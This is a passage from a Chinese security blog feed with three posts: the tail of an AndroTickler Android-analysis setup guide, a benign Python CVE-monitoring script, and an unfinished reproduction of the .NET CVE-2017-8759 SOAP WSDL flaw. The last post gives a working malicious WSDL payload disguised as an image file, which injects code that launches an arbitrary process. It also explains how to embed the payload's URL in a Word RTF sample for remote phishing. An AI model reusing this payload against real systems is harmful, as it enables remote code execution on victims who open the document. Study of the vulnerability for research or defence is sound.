src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF4.jpg" alt="查看app信息4"><br>而在Tickler_workspace\com.example.simpleencryption\logs.pullLog.log发现了这样的日志。<br><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF5.jpg" alt="查看app信息5"><br>安装过的app保存位置为：<code>/data/app</code><br><img src="%E5%AE%89%E8%A3%85%E8%BF%87%E7%9A%84app.jpg" alt="安装过的app"><br>修改Tickler.conf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Tickler_local_directory &#x3D; H:&#x2F;workspace&#x2F;eclipse&#x2F;AndroTickler&#x2F;build&#x2F;libs&#x2F;</span><br><span class="line">Tickler_sdcard_directory &#x3D; &#x2F;data&#x2F;app&#x2F;</span><br><span class="line">Frida_server_path &#x3D; &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server-10.3.14-android-arm</span><br></pre></td></tr></table></figure><p>编译运行，没有报错，查看Tickler_workspace\com.example.simpleencryption\logs.pullLog.log文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cannot create &#39;H:\workspace\eclipse\AndroTickler\build\libs\com.example.simpleencryption\\&#39;: Not a directory</span><br></pre></td></tr></table></figure><p>然后通过调试，来寻找错误的地方（这里的图为之前调试的图( ╯□╰ )）</p><p><img src="%E5%AF%BC%E5%87%BAapk%E9%94%99%E8%AF%AF.jpg" alt="导出apk错误"></p><p>执行的命令为：<code>nox_adb pull /data/app/com.jnu.ctf2017-1.apk H:/AndroTickler/com.jnu.ctf2017//</code><br>测试后发现，使用<code>adb pull</code>导出文件时，pc的路径最后不能有<code>\</code>或者<code>/</code><br><img src="%E5%AF%BC%E5%87%BA%E6%B5%8B%E8%AF%95.jpg" alt="导出测试"></p><p>直接修改base\FileUtil.java中copyDirToHost方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//this.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest+"/"); by fuping</span></span><br><span class="line"><span class="keyword">this</span>.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest);</span><br></pre></td></tr></table></figure><p>修改base\FileUtil.java中pullFromSDcard方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pullFromSDcard</span><span class="params">(String src, String dest)</span> </span>&#123;</span><br><span class="line">String fName = <span class="keyword">this</span>.getFileNameFromPath(src);</span><br><span class="line"><span class="keyword">this</span>.warnOverrideAndDelete(dest+fName);</span><br><span class="line"><span class="comment">//by fuping</span></span><br><span class="line">File f  = <span class="keyword">new</span> File(dest);</span><br><span class="line"><span class="keyword">if</span>(!f.exists())&#123;</span><br><span class="line">f.mkdirs();</span><br><span class="line">&#125;<span class="comment">// by fuping</span></span><br><span class="line">dest = f.getPath();</span><br><span class="line">String command = <span class="string">"nox_adb pull "</span>+src+<span class="string">" "</span>+dest;</span><br><span class="line"><span class="keyword">int</span> pullResult=<span class="keyword">this</span>.commando.executeProcessForAdbPull(command);</span><br><span class="line"><span class="keyword">this</span>.deleteDirFromDevice(src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF6.jpg" alt="查看app信息6"></p><p>还有一些需要更改的地方，例如将代码中调用dex2jar-2.1的<code>.sh</code>脚本改为<code>.bat</code> 。之后在编译运行。</p><p><img src="%E6%9F%A5%E7%9C%8Bapp%E4%BF%A1%E6%81%AF7.jpg" alt="查看app信息7"><br>此时这个工具才能算可以使用，还有其他功能（例如Frida），我并未测试。当然还可能还会有其他问题，这里就不再深入了。</p><p>这里放上一个查看app详细信息的结果。<br><img src="%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF1.jpg" alt="详细信息1"><br><img src="%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF2.jpg" alt="详细信息2"></p><blockquote><p>可以看到安装日期、使用权限、数据库存储等等信息。</p></blockquote><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>虽然看起来在运行的时候有很多坑，但其原因也是环境的问题（我采用的是Windows）。而且我使用了模拟器而不是真机，所以也可能造成一些问题。但是这些都是无关紧要的，都是很小的错误，修改一下就可以用了。我这里仅仅使用了查看app信息的功能，并未测试其他功能。更多功能可以参考<a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">https://github.com/ernw/AndroTickler</a> 。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
            <tag> AndroTickler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE监控之Python代码实现</title>
      <link href="/2017/12/11/NEW-CVE-Monitor/"/>
      <url>/2017/12/11/NEW-CVE-Monitor/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>前几天在先知上看到<a href="https://xianzhi.aliyun.com/forum/topic/1694/" target="_blank" rel="noopener">伪全栈式安全研发：CVE监控</a>这篇文章，就想着也实现一下代码进行最新CVE的监控。语言采用了Python，数据库也为Mongodb数据库。代码和实现的什么不重要，重要的是过程。</p><p>主要包括以下几个方面。</p><ol><li>获取最新的CVE列表和详情<br>主要采用了python的requests模块和BeautifulSoup模块。</li><li>将最新的CVE信息存入数据库<br>数据库使用了Mongodb，采用了pymongo模块。</li><li>通过邮件发送最新的CVE信息<br>发送邮件采用了smtplib模块。</li><li>定时执行任务<br>使用了linux的crontab来实现。</li></ol><a id="more"></a><h1 id="0x02-实现过程"><a href="#0x02-实现过程" class="headerlink" title="0x02 实现过程"></a>0x02 实现过程</h1><h2 id="1-获取最新的CVE列表和详情"><a href="#1-获取最新的CVE列表和详情" class="headerlink" title="1. 获取最新的CVE列表和详情"></a>1. 获取最新的CVE列表和详情</h2><p>访问<a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html" target="_blank" rel="noopener">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a> ，可以获取每天新增的CVE信息。</p><p><img src="%E6%8E%A5%E5%8F%A31.jpg" alt="接口1"></p><p><img src="%E6%8E%A5%E5%8F%A31%E6%BA%90%E4%BB%A3%E7%A0%81.jpg" alt="接口源代码"><br>通过查看源代码，发现没html没什么规律可言，都是些超链接。要想获取最新的列表，可以通过取文本中间的方法来获取。<br>这里需要获取<code>New entries:</code>和<code>Graduations</code>之间的内容。然后通过BeautifulSoup来解析其中的超链接。<br>主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCVES</span><span class="params">()</span>:</span><span class="comment"># 获取最新到CVE列表</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">'https://cassandra.cerias.purdue.edu/CVE_changes/today.html'</span></span><br><span class="line">        res = requests.get(url, headers=headers, timeout=<span class="number">60</span>)</span><br><span class="line">        CVEList_html = getMiddleStr(res.text, <span class="string">'New entries:'</span>, <span class="string">'Graduations'</span>)</span><br><span class="line">        soup = BeautifulSoup(CVEList_html, <span class="string">'html.parser'</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</span><br><span class="line">            print(a[<span class="string">'href'</span>])</span><br><span class="line">            print(a.string)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure><p>获取文本中间内容的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMiddleStr</span><span class="params">(content, startStr, endStr)</span>:</span> <span class="comment"># 获取文本中间内容</span></span><br><span class="line">    startIndex = content.index(startStr)</span><br><span class="line">    <span class="keyword">if</span> startIndex &gt;= <span class="number">0</span>:</span><br><span class="line">        startIndex += len(startStr)</span><br><span class="line">        endIndex = content.index(endStr)</span><br><span class="line">    <span class="keyword">return</span> content[startIndex:endIndex]</span><br></pre></td></tr></table></figure><p>运行效果：<br><img src="%E8%8E%B7%E5%8F%96CVE%E5%88%97%E8%A1%A8.jpg" alt="获取cve列表"><br>超链接的地址是CVE的详情。随便进入一个查看效果。<br>例如：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0874" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0874</a><br><img src="CVE%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF.jpg" alt="CVE详细信息"><br>这里需要记录的信息有：CVE-ID、Description、Assigning CNA和Date Entry Created。</p><p><img src="CVE%E8%AF%A6%E6%83%85%E7%BD%91%E9%A1%B5%E6%BA%90%E4%BB%A3%E7%A0%81.jpg" alt="CVE详情网页源代码"><br>通过查看网页源码发现，所有需要记录的信息在一个表格里面。但该页面有很多table，而且没有明显的标识来区分。而该table在div中，可以通过id来获取。<br>CVE-ID可以直接通过<code>soup.find(nowrap=&#39;nowrap&#39;).find(&#39;h2&#39;).string</code>获取。其他的几个信息可以通过获取相应tr中的td中的内容获得。<br><img src="%E8%8E%B7%E5%8F%96CVE%E8%AF%A6%E6%83%85.jpg" alt="获取CVE详情"><br>这样就可以获取最新的CVE列表和详情。</p><h2 id="2-将最新的CVE信息存入数据库"><a href="#2-将最新的CVE信息存入数据库" class="headerlink" title="2. 将最新的CVE信息存入数据库"></a>2. 将最新的CVE信息存入数据库</h2><p>数据库采用了Mongodb。安装方法<code>apt-get install mongodb</code><br>然后启动数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/data/ <span class="comment">#创建数据存储位置</span></span><br><span class="line">mongod --port 65521 --dbpath /var/data/ --bind_ip 127.0.0.1 <span class="comment">#启动mongodb，指定端口和路径，且仅本机可连</span></span><br><span class="line">mongo 127.0.0.1:65521/mydb </span><br><span class="line">db.createUser(&#123;user:<span class="string">'tass'</span>,<span class="built_in">pwd</span>:<span class="string">'liehu'</span>,roles:[&#123;role:<span class="string">'dbOwner'</span>,db:<span class="string">'mydb'</span>&#125;]&#125;) <span class="comment">#添加认证</span></span><br></pre></td></tr></table></figure><p>Mongodb数据库插入一条数据，一般使用的是insert。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.test.insert(&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test1"</span>&#125;)</span><br></pre></td></tr></table></figure><p>如果我们想实现一个如果title存在，就对数据进行更新，不存在，就插入。可以这样来实现。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.test.update(&#123;<span class="string">"title"</span>:<span class="string">"test2"</span>&#125;, &#123;<span class="variable">$set</span>:&#123;<span class="string">"title"</span>:<span class="string">"test2"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test2"</span>&#125;&#125;, &#123;upsert:<span class="literal">true</span>&#125;)</span><br><span class="line">db.test.update(&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>&#125;, &#123;<span class="variable">$set</span>:&#123;<span class="string">"title"</span>:<span class="string">"test1"</span>, <span class="string">"blog_cont"</span>:<span class="string">"test3"</span>&#125;&#125;, &#123;upsert:<span class="literal">true</span>&#125;)</span><br><span class="line">db.test.find()</span><br></pre></td></tr></table></figure><p>执行完成后最终有两条数据，title分别为test1和test2，对应的内容为test3和test2.</p><p><img src="insertOrUpdate.jpg" alt="存在更新，不存在插入"><br>因此在插入数据的时候，我们可以直接使用<code>db.test.update({&quot;title&quot;:&quot;test2&quot;}, {$set:{&quot;title&quot;:&quot;test2&quot;, &quot;blog_cont&quot;:&quot;test2&quot;}}, {upsert:true})</code>这种方式来实现。</p><p><img src="%E6%8F%92%E5%85%A5%E6%B5%8B%E8%AF%95.jpg" alt="插入测试"><br>更新只需更改data内容即可。<br><img src="%E6%9B%B4%E6%96%B0%E6%B5%8B%E8%AF%95.jpg" alt="更新测试"></p><blockquote><p>为了数据库的安全性，使用<code>--bind_ip 127.0.0.1</code>来设置数据库仅本地可以连接。更多mongodb数据库的配置可以参考<a href="http://blog.csdn.net/guoxingege/article/details/47339885" target="_blank" rel="noopener">MongoDB Mongodb.conf 配置 Auth</a>。</p></blockquote><h2 id="3-通过邮件发送最新的CVE信息"><a href="#3-通过邮件发送最新的CVE信息" class="headerlink" title="3. 通过邮件发送最新的CVE信息"></a>3. 通过邮件发送最新的CVE信息</h2><p>发送邮件这里用到了smtplib。<br>发送邮件比较简单，就直接贴代码了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEmail</span><span class="params">(mail_msg)</span>:</span>  <span class="comment"># 发送邮件</span></span><br><span class="line">    sender = <span class="string">'from@163.com'</span> <span class="comment"># 发件人</span></span><br><span class="line">    password = <span class="string">'password'</span> <span class="comment"># 发件人密码</span></span><br><span class="line">    receiver = <span class="string">'receiver@163.com'</span> <span class="comment"># 收件人</span></span><br><span class="line">    message = MIMEText(mail_msg, <span class="string">'plain'</span>, <span class="string">'utf-8'</span>) <span class="comment">#以文本发送</span></span><br><span class="line">    message[<span class="string">'From'</span>] = sender</span><br><span class="line">    message[<span class="string">'To'</span>] = receiver</span><br><span class="line"></span><br><span class="line">    subject = <span class="string">'最新CVE列表'</span></span><br><span class="line">    message[<span class="string">'Subject'</span>] = Header(subject, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        smtpObj = smtplib.SMTP(<span class="string">'smtp.163.com'</span>)</span><br><span class="line">        smtpObj.login(sender, password)</span><br><span class="line">        smtpObj.sendmail(sender, receiver, message.as_string())</span><br><span class="line">        print(<span class="string">'邮件发送成功'</span>)</span><br><span class="line">    <span class="keyword">except</span> smtplib.SMTPException:</span><br><span class="line">        print(<span class="string">'Error: 无法发送邮件'</span>)</span><br></pre></td></tr></table></figure><h2 id="4-定时执行任务"><a href="#4-定时执行任务" class="headerlink" title="4. 定时执行任务"></a>4. 定时执行任务</h2><p>直接使用linux下的crontab来完成。<br>例如设置每天早上7点执行，可以这样设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 7 * * * python /myJob/CVE-Monitor.py &gt;&gt; /<span class="built_in">log</span>/CVE-Monitor.log</span><br></pre></td></tr></table></figure><blockquote><p>根据<a href="https://cassandra.cerias.purdue.edu/CVE_changes/" target="_blank" rel="noopener">https://cassandra.cerias.purdue.edu/CVE_changes/</a> 看到today.html更新的时间是明天的06:53，对应北京时间是19:53。若想及时获取，可以更换时间为20:00.</p></blockquote><h2 id="5-完善和优化"><a href="#5-完善和优化" class="headerlink" title="5.完善和优化"></a>5.完善和优化</h2><p>到这里监控脚本完成的差不多了，剩下就是如何来融合一起并改善了。<br>为了方便发送邮件内容和插入数据库，我们新建类CVEInfo。主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CVEInfo</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url, cveid, description, company, createdate)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.cveid = cveid</span><br><span class="line">        self.description = description</span><br><span class="line">        self.company = company</span><br><span class="line">        self.createdate = createdate</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p&gt;&lt;b&gt;漏洞编号：&lt;/b&gt;&lt;a href="'</span>+self.url+<span class="string">'"&gt;'</span>+self.cveid+<span class="string">'&lt;/a&gt;&lt;/p&gt;&lt;b&gt;相关厂商：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.company +<span class="string">'&lt;br&gt;&lt;b&gt;披露日期：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.createdate+<span class="string">'&lt;br&gt;&lt;b&gt;漏洞描述：&lt;/b&gt;'</span>\</span><br><span class="line">            +self.description + <span class="string">'&lt;br&gt;&lt;br&gt;&lt;hr/&gt;'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'cveid'</span>: self.cveid,</span><br><span class="line">            <span class="string">'description'</span>: self.description,</span><br><span class="line">            <span class="string">'company'</span>: self.company,</span><br><span class="line">            <span class="string">'createdate'</span>: datetime.strptime(self.createdate, <span class="string">"%Y%m%d"</span>),</span><br><span class="line">            <span class="string">'addDate'</span>: time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>, time.localtime(time.time())),</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>为了美观，将邮件以html方式发送</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message = MIMEText(mail_msg, <span class="string">'html'</span>, <span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>邮箱收到的效果：<br><img src="%E9%82%AE%E4%BB%B6%E5%86%85%E5%AE%B9.jpg" alt="邮件内容"><br>查看数据库数据：<br><img src="%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9.jpg" alt="数据库内容"></p><p>从上面两张图片可以看到有三十多个，但我们有时候并不是都需要看。我们可以根据Description中关键信息来进行过滤，仅仅将我们需要关注的CVE信息发送到邮箱或进行入库操作。<br>如下图为获取<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-8295" target="_blank" rel="noopener">CVE-2017-8295</a>的信息。<br><img src="%E6%B7%BB%E5%8A%A0%E5%85%B3%E9%94%AE%E5%AD%97%E5%8C%B9%E9%85%8D.jpg" alt="添加关键字匹配"><br>然后修改main方法，根据是否有关注的CVE信息来决定邮件的内容。<br>这里先用本地服务器为例，新建today.html文件，其中包含<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-9805" target="_blank" rel="noopener">CVE-2017-9805</a>和<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-16241" target="_blank" rel="noopener">CVE-2017-16241</a>。<br><img src="%E5%85%B3%E9%94%AE%E5%AD%97%E5%8C%B9%E9%85%8D.jpg" alt="关键字匹配"><br>运行代码结果打印了一条包含了我们的关键字的数据。<br>邮件中的内容如下所示：<br><img src="%E5%85%B3%E9%94%AE%E5%AD%97%E5%8C%B9%E9%85%8D%E9%82%AE%E4%BB%B6%E5%86%85%E5%AE%B9.jpg" alt="关键字匹配邮件内容"><br>这样就能过滤其他CVE信息，仅仅记录我们关注的内容了。</p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>本文主要用到了BeautifulSoup解析网页和mongodb数据库的使用，然后就可以将想要的内容保存到数据库中。脚本并不限于在此处使用，也可以修改一下抓取其他网站内容。<br>代码地址：<a href="https://github.com/fupinglee/MyPython/blob/master/work/CVE-Monitor.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/work/CVE-Monitor.py</a><br>查询的功能就不做了，若想实现其他功能，可以自行增加和修改。</p><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p>[1]<a href="https://xianzhi.aliyun.com/forum/topic/1694/" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/1694/</a><br>[2]<a href="http://blog.csdn.net/guoxingege/article/details/47339885" target="_blank" rel="noopener">http://blog.csdn.net/guoxingege/article/details/47339885</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程之美 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-Monitor </tag>
            
            <tag> Mongodb数据库 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.NET框架0Day漏洞CVE-2017-8759复现过程</title>
      <link href="/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/"/>
      <url>/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p><a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">FireEye</a>最近检测到一个恶意的Microsoft Office RTF文档，利用<a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759" target="_blank" rel="noopener">CVE-2017-8759</a>（一种SOAP WSDL解析器代码注入漏洞）。此漏洞允许在解析SOAP WSDL定义内容期间注入任意代码。</p><a id="more"></a><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>漏洞名称：.NET Framework远程代码执行漏洞<br>漏洞编号：CVE-2017-8759<br>漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统<br>利用场景：远程钓鱼、社会工程<br>影响版本：以下.NET版本<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.2<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.1<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5.1<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.7<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.5.2<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5<br>&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 2.0 SP2<br>影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint</p><h1 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h1><p>PrintClientProxy方法中的WSDL解析器模块中存在代码注入漏洞。如果提供的包含CRLF序列的数据，则IsValidUrl不会执行正确的验证。这就造成了攻击者注入和执行任意代码。</p><p>这里不详细介绍了（因为我也不懂），可以参考火眼和360的分析。</p><p><img src="%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95.jpg" alt="本地测试"></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>新建一个图片文件，名字为office.png（其他格式也行），内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">definitions</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:soap</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/soap/"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:suds</span>=<span class="string">"http://www.w3.org/2000/wsdl/suds"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tns</span>=<span class="string">"http://schemas.microsoft.com/clr/ns/System"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:ns0</span>=<span class="string">"http://schemas.microsoft.com/clr/nsassem/Logo/Logo"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">portType</span> <span class="attr">name</span>=<span class="string">"PortType"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">binding</span> <span class="attr">name</span>=<span class="string">"Binding"</span> <span class="attr">type</span>=<span class="string">"tns:PortType"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">soap:binding</span> <span class="attr">style</span>=<span class="string">"rpc"</span> <span class="attr">transport</span>=<span class="string">"http://schemas.xmlsoap.org/soap/http"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">suds:class</span> <span class="attr">type</span>=<span class="string">"ns0:Image"</span> <span class="attr">rootType</span>=<span class="string">"MarshalByRefObject"</span>&gt;</span><span class="tag">&lt;/<span class="name">suds:class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">binding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">"Service"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">port</span> <span class="attr">name</span>=<span class="string">"Port"</span> <span class="attr">binding</span>=<span class="string">"tns:Binding"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">"http://localhost?C:\Windows\System32\calc.exe?011"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:address</span> <span class="attr">location</span>=<span class="string">";</span></span></span><br><span class="line"><span class="tag"><span class="string">if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) &#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);</span></span></span><br><span class="line"><span class="tag"><span class="string">System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true);</span></span></span><br><span class="line"><span class="tag"><span class="string">&#125; //"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">definitions</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后放在web目录。<br>根据样本文件，发现是在word文档中添加一个SOAP标记。<br>格式为<code>soap:wsdl=http://192.168.135.135/office/office.png</code><br>本次以样本为例，然后修改其中的地址。<br><img src="%E6%A0%B7%E6%9C%AC%E6%96%87%E4%BB%B6.jpg" alt="样本文件"></p><p>分别用样本和自己的web地址生成特hex格式的地址，然后将样本中的地址更换为自己的地址即可。（注意替换的长度需保持一致）</p><p><img src="%E7%94%9F%E6%88%90hex%E6%A0%BC%E5%BC%8F%E7%9A%84%E5%9C%B0%E5%9D%80.jpg" alt="生成hex格式的地址"></p><p>样本文件最重要的是倒数第三行（看起来是空白），然后可以将上面无用的内容全部删除，只留下最后三行。</p><p><img src="%E6%9B%BF%E6%8D%A2%E5%9C%B0%E5%9D%80%E5%90%8E%E7%9A%84%E5%86%85%E5%AE%B9.jpg" 